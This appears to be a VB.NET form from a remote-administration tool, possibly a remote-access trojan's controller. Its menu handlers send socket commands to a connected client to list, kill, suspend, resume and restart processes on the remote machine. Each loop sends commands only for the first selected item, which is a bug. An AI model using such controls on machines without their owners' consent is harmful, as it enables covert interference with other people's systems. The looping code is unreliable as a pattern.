Imports System.ComponentModel

Public Class FrmProcessos

    Public sk As MdClient

    Private Sub AtualizarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AtualizarToolStripMenuItem.Click
        sk.Send("PegarProcessos")
    End Sub

    Private Sub ReniciarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ReniciarToolStripMenuItem.Click
        For Each U In LvListProcess.SelectedItems
            sk.Send("RestarttProcesss" & MdSokserver.Y & LvListProcess.SelectedItems(0).SubItems(2).Text & MdSokserver.Y & LvListProcess.SelectedItems(0).SubItems(1).Text & MdSokserver.Y)
        Next
    End Sub

    Private Sub FinalizarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FinalizarToolStripMenuItem.Click
        For Each U In LvListProcess.SelectedItems
            sk.Send("FinalizarProcesss" & MdSokserver.Y & LvListProcess.SelectedItems(0).Text & MdSokserver.Y)
        Next
    End Sub

    Private Sub ResumeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ResumeToolStripMenuItem.Click
        For Each U In LvListProcess.SelectedItems
            sk.Send("ResumerrProcesss" & MdSokserver.Y & LvListProcess.SelectedItems(0).Text & MdSokserver.Y)
        Next
    End Sub

    Private Sub SuspenderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspenderToolStripMenuItem.Click
        For Each U In LvListProcess.SelectedItems
            sk.Send("SuspenderProcesss" & MdSokserver.Y & LvListProcess.SelectedItems(0).Text & MdSokserver.Y)
        Next
    End Sub
End Class